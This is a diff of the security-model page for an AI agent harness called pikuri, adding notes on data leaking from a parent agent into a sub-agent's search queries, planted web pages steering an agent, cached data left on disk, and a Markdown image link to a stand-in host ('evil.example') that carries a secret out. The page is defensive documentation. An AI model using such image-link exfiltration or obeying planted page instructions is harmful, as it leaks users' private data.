@@ -9,9 +9,9 @@ This is the *committed* model — what ships today, stated tersely.
 The teaching version — the threat from first principles, five
 worked attacks told as stories, and a decision procedure for
 designing your own harness — is
-[the security chapter of the guide](book/security.md). Open questions,
-deferred mitigations, and prior-art notes live in
-[`design/ideas/security-open-questions.md`](design/ideas/security-open-questions.md).
+[the security chapter of the guide](book/security.md). What isn't
+built yet lives in [`design/ideas/`](design/ideas/) and in
+[pikuri-workshop's security log](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/security-open-questions.md).
 
 Two axes, in order. **Code trust:** which processes do you trust to
 execute their intended code? A short section, settled in one pass.
@@ -111,6 +111,12 @@ can do there is whatever the parent's own legs allow, which is why
 every binary prints its trifecta map at boot
 ([measuring the trifecta](book/trifecta-detector.md)).
 
+*The other direction leaks too.* The parent writes the child's task,
+so a parent holding your data can put it into `RESEARCHER`'s next
+search query. The `agent` tool can show you each task, editable,
+before it leaves, and the map's `[gate: …]` marker says whether it
+does.
+
 **Reading search results without visiting the pages.** Snippets
 rarely answer a question, so an agent that searches usually also
 gets `web_scrape` — and then a planted page can tell it to visit
@@ -173,6 +179,17 @@ as a guarantee:
 - **Pikuri does not sandbox its own process.** For real isolation
   against a compromised pikuri or compromised tool, run pikuri
   itself inside a VM or container.
+- **What pikuri leaves on disk.** `fetch`, `web_scrape` and
+  `web_search` keep what they fetched in `~/.cache/pikuri/url_cache/`
+  for two hours, and the Thunderbird tools read a copy of your mail
+  and calendar databases under `~/.cache/pikuri/temp-*/`, deleted
+  when pikuri exits. Any program running as you can read both, and so
+  can a backup that includes `~/.cache`; only disk encryption guards
+  them.
+- **A host that renders the model's Markdown.** If your UI fetches
+  the images in a reply, `![](https://evil.example/?d=<secret>)` is
+  egress the trifecta map never sees. pikuri's terminal prints such a
+  link as text; a web UI should too, or fetch nothing the model named.
 - **An agent wired with both fs-read and egress as a parent.** The
   persona model protects sub-agents that touch untrusted content.
   A parent with `read` + `fetch` + a tool that scrapes the web
@@ -187,8 +204,9 @@ as a guarantee:
   companion to this page: the threat from first principles, the five
   attacks as stories, and a decision procedure for picking a model
   when you build your own harness.
-- [`design/ideas/security-open-questions.md`](design/ideas/security-open-questions.md)
-  — open mitigations under consideration and prior-art notes.
+- [pikuri-workshop's security log](https://github.com/mvysny/pikuri-workshop/blob/master/design/ideas/security-open-questions.md)
+  — mitigations under consideration, most of them for agents that run
+  a shell.
 - [pikuri-workshop's `SECURITY.md`](https://github.com/mvysny/pikuri-workshop/blob/master/SECURITY.md)
   — the coding agent's kit: Bubblewrap, MCP in Docker, the MCP
   description verifier, `--yolo`.
